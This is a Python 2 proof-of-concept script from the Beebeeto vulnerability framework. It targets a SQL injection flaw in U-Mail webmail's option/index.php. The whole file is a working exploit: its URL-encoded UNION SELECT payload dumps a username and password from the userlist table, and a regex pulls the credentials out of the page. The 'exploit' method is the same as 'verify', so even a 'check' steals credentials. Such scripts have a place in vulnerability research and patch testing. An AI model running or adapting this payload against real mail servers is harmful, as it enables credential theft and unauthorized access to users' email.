#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2014-0106',
            'name': 'U-Mail /webmail/client/option/index.php SQL注入漏洞 Exploit',
            'author': '叶子',
            'create_date': '2014-10-23',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul': {
            'app_name': 'U-Mail',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['SQL Injection', 'U-Mail漏洞', '/webmail/client/option/index.php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2010-073032'],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/webmail/client/option/index.php?module=view&action=letterpaper&id=1%20and%201=2%20union%20select%201,2,3,"
                   "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8"
                   "/**/from/**/userlist/**/limit/**/0,1%23")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r".*?<img id=\"littleing\" src=\"\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*\"></img>", re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())